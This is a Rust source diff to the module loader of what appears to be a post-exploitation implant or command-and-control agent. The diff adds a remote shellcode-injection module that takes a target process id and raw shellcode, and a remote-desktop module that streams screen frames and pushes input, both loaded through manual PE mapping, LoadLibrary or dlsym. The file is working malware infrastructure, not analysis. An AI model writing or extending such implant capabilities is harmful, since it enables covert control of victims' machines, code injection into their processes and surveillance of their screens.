@@ -24,8 +24,12 @@ pub const MOD_SOCKS: &str = "socks";
 pub const MOD_PLUGIN: &str = "plugin";
 pub const MOD_BOF: &str = "bof";
 pub const MOD_DOTNET: &str = "dotnet";
+/// Remote process shellcode inject — L2 only (`modules/inject`)
+pub const MOD_INJECT: &str = "inject";
 /// Sacrificial host PE (cupcake-iso-host) — staged bytes only, never LoadLibrary
 pub const MOD_ISO_HOST: &str = "iso_host";
+/// Remote desktop L2 package id (explicit Module panel load; no auto-stage)
+pub const MOD_DESKTOP: &str = "desktop";
 
 /// Map command_type → required L2 module.
 ///
@@ -41,6 +45,10 @@ pub fn module_for_command(command_type: &str) -> Option<&'static str> {
         "bof_exec" => Some(MOD_BOF),
         "execute_assembly" => Some(MOD_DOTNET),
         "plugin_cache" | "plugin_exec" => Some(MOD_PLUGIN),
+        // Process inject: never Stage0 — always L2 mod_inject
+        "process_inject" | "shellcode_inject" | "inject_shellcode" | "inject" => Some(MOD_INJECT),
+        // Desktop control-plane cmds (stream still requires feature desktop + Yamux 0x0D)
+        "desktop_probe" | "desktop_start" | "desktop_stop" | "desktop_config" => Some(MOD_DESKTOP),
         _ => None,
     }
 }
@@ -74,6 +82,11 @@ type ModInvokeFn = unsafe extern "C" fn(
 ) -> i32;
 type ModFreeFn = unsafe extern "C" fn(ptr: *mut u8, len: u32);
 type ModShutdownFn = unsafe extern "C" fn() -> i32;
+type ModStreamAttachFn = unsafe extern "C" fn(u32) -> i32;
+type ModStreamPollFrameFn =
+    unsafe extern "C" fn(u32, u32, *mut u8, u32, *mut u32, *mut *mut u8, *mut u32) -> i32;
+type ModStreamPushInputFn = unsafe extern "C" fn(u32, *const u8, u32) -> i32;
+type ModStreamDetachFn = unsafe extern "C" fn(u32) -> i32;
 
 struct LoadedModule {
     /// Image base (Manual-Map) or HMODULE (LoadLibrary). 0 = not a PE module (test/hosted).
@@ -89,6 +102,21 @@ struct LoadedModule {
     mod_invoke: Option<ModInvokeFn>,
     mod_free: Option<ModFreeFn>,
     mod_shutdown: Option<ModShutdownFn>,
+    /// Optional desktop stream ABI (mod_desktop).
+    mod_stream_attach: Option<ModStreamAttachFn>,
+    mod_stream_poll_frame: Option<ModStreamPollFrameFn>,
+    mod_stream_push_input: Option<ModStreamPushInputFn>,
+    mod_stream_detach: Option<ModStreamDetachFn>,
+}
+
+/// Snapshot of desktop stream C exports for Yamux bridge (no lock held across calls).
+#[derive(Clone, Copy)]
+pub struct DesktopStreamApi {
+    pub attach: ModStreamAttachFn,
+    pub poll_frame: ModStreamPollFrameFn,
+    pub push_input: ModStreamPushInputFn,
+    pub detach: ModStreamDetachFn,
+    pub free: Option<ModFreeFn>,
 }
 
 struct ModuleEntry {
@@ -186,6 +214,23 @@ impl ModuleRegistry {
         if let Ok(mut g) = self.key_override.lock() {
             *g = key;
         }
+    }
+
+    /// Desktop stream exports if module `desktop` is Loaded and complete ABI present.
+    pub fn desktop_stream_api(&self) -> Option<DesktopStreamApi> {
+        let g = self.entries.lock().ok()?;
+        let e = g.get(MOD_DESKTOP)?;
+        if e.state != ModuleState::Loaded {
+            return None;
+        }
+        let loaded = e.loaded.as_ref()?;
+        Some(DesktopStreamApi {
+            attach: loaded.mod_stream_attach?,
+            poll_frame: loaded.mod_stream_poll_frame?,
+            push_input: loaded.mod_stream_push_input?,
+            detach: loaded.mod_stream_detach?,
+            free: loaded.mod_free,
+        })
     }
 
     pub fn is_loaded(&self, id: &str) -> bool {
@@ -359,6 +404,10 @@ impl ModuleRegistry {
                 mod_invoke: None,
                 mod_free: None,
                 mod_shutdown: None,
+                mod_stream_attach: None,
+                mod_stream_poll_frame: None,
+                mod_stream_push_input: None,
+                mod_stream_detach: None,
             });
             e.host_pe = None;
             info!("[module_loader] loaded hosted stub module {}", id);
@@ -608,6 +657,10 @@ fn map_pe_windows(pe: &[u8]) -> Result<LoadedModule, String> {
                     mod_invoke: m.mod_invoke,
                     mod_free: m.mod_free,
                     mod_shutdown: m.mod_shutdown,
+                    mod_stream_attach: m.mod_stream_attach,
+                    mod_stream_poll_frame: m.mod_stream_poll_frame,
+                    mod_stream_push_input: m.mod_stream_push_input,
+                    mod_stream_detach: m.mod_stream_detach,
                 });
             }
             Err(e) => {
@@ -733,6 +786,18 @@ fn map_pe_windows_loadlibrary(pe: &[u8]) -> Result<LoadedModule, String> {
         unsafe { resolve(get_proc, handle, b"mod_free").map(|a| std::mem::transmute(a)) };
     let mod_shutdown =
         unsafe { resolve(get_proc, handle, b"mod_shutdown").map(|a| std::mem::transmute(a)) };
+    let mod_stream_attach = unsafe {
+        resolve(get_proc, handle, b"mod_stream_attach").map(|a| std::mem::transmute(a))
+    };
+    let mod_stream_poll_frame = unsafe {
+        resolve(get_proc, handle, b"mod_stream_poll_frame").map(|a| std::mem::transmute(a))
+    };
+    let mod_stream_push_input = unsafe {
+        resolve(get_proc, handle, b"mod_stream_push_input").map(|a| std::mem::transmute(a))
+    };
+    let mod_stream_detach = unsafe {
+        resolve(get_proc, handle, b"mod_stream_detach").map(|a| std::mem::transmute(a))
+    };
 
     if mod_invoke.is_none() {
         unsafe {
@@ -754,6 +819,10 @@ fn map_pe_windows_loadlibrary(pe: &[u8]) -> Result<LoadedModule, String> {
         mod_invoke,
         mod_free,
         mod_shutdown,
+        mod_stream_attach,
+        mod_stream_poll_frame,
+        mod_stream_push_input,
+        mod_stream_detach,
     })
 }
 
@@ -790,6 +859,15 @@ fn map_pe_unix(pe: &[u8]) -> Result<LoadedModule, String> {
         let free = libc::dlsym(handle, free_name.as_ptr());
         let shut = libc::dlsym(handle, shut_name.as_ptr());
 
+        let attach_name = std::ffi::CString::new("mod_stream_attach").unwrap();
+        let poll_name = std::ffi::CString::new("mod_stream_poll_frame").unwrap();
+        let push_name = std::ffi::CString::new("mod_stream_push_input").unwrap();
+        let det_name = std::ffi::CString::new("mod_stream_detach").unwrap();
+        let att = libc::dlsym(handle, attach_name.as_ptr());
+        let pol = libc::dlsym(handle, poll_name.as_ptr());
+        let psh = libc::dlsym(handle, push_name.as_ptr());
+        let det = libc::dlsym(handle, det_name.as_ptr());
+
         Ok(LoadedModule {
             handle: handle as usize,
             mapped_size: 0,
@@ -811,6 +889,26 @@ fn map_pe_unix(pe: &[u8]) -> Result<LoadedModule, String> {
                 None
             } else {
                 Some(std::mem::transmute(shut))
+            },
+            mod_stream_attach: if att.is_null() {
+                None
+            } else {
+                Some(std::mem::transmute(att))
+            },
+            mod_stream_poll_frame: if pol.is_null() {
+                None
+            } else {
+                Some(std::mem::transmute(pol))
+            },
+            mod_stream_push_input: if psh.is_null() {
+                None
+            } else {
+                Some(std::mem::transmute(psh))
+            },
+            mod_stream_detach: if det.is_null() {
+                None
+            } else {
+                Some(std::mem::transmute(det))
             },
         })
     }
@@ -871,6 +969,16 @@ pub fn ensure_module_for_command(command_type: &str) -> Result<(), String> {
     }
 }
 
+/// True when L2 `desktop` is loaded with stream exports (Yamux bridge can run).
+pub fn desktop_module_ready() -> bool {
+    registry().desktop_stream_api().is_some()
+}
+
+/// Snapshot desktop stream C ABI (None if not loaded).
+pub fn desktop_stream_api() -> Option<DesktopStreamApi> {
+    registry().desktop_stream_api()
+}
+
 /// Optional L2 shell module invoke (legacy/experimental). Daily reverse uses built-in post-ex.
 pub fn invoke_shell(command: &str) -> Result<CommandResult, String> {
     if !registry().is_loaded(MOD_SHELL) {
@@ -902,6 +1010,40 @@ pub fn invoke_dotnet(assembly: &[u8], args: &[String]) -> Result<CommandResult, 
     });
     let bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
     registry().invoke(MOD_DOTNET, "execute_assembly", &bytes)
+}
+
+/// Invoke L2 `inject` module: remote shellcode into `pid`.
+/// `shellcode` raw bytes; `method` = auto|nt|crt; `wait_ms` optional.
+pub fn invoke_inject(
+    pid: u32,
+    shellcode: &[u8],
+    method: &str,
+    wait_ms: u32,
+) -> Result<CommandResult, String> {
+    ensure_module_for_command("process_inject")?;
+    let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, shellcode);
+    let payload = serde_json::json!({
+        "pid": pid,
+        "data": data_b64,
+        "method": method,
+        "wait_ms": wait_ms,
+    });
+    let bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
+    registry().invoke(MOD_INJECT, "process_inject", &bytes)
+}
+
+/// Invoke inject with a pre-built JSON body (panel/operator free-form).
+pub fn invoke_inject_json(cmd_type: &str, json_body: &[u8]) -> Result<CommandResult, String> {
+    ensure_module_for_command(cmd_type)?;
+    let ct = if matches!(
+        cmd_type,
+        "process_inject" | "shellcode_inject" | "inject_shellcode" | "inject"
+    ) {
+        "process_inject"
+    } else {
+        cmd_type
+    };
+    registry().invoke(MOD_INJECT, ct, json_body)
 }
 
 /// Handle module_stage / module_push: id from path/content, data = base64 CKMS.
@@ -961,6 +1103,9 @@ mod tests {
         assert_eq!(module_for_command("bof_exec"), Some(MOD_BOF));
         assert_eq!(module_for_command("execute_assembly"), Some(MOD_DOTNET));
         assert_eq!(module_for_command("plugin_exec"), Some(MOD_PLUGIN));
+        assert_eq!(module_for_command("process_inject"), Some(MOD_INJECT));
+        assert_eq!(module_for_command("shellcode_inject"), Some(MOD_INJECT));
+        assert_eq!(module_for_command("inject"), Some(MOD_INJECT));
     }
 
     #[test]
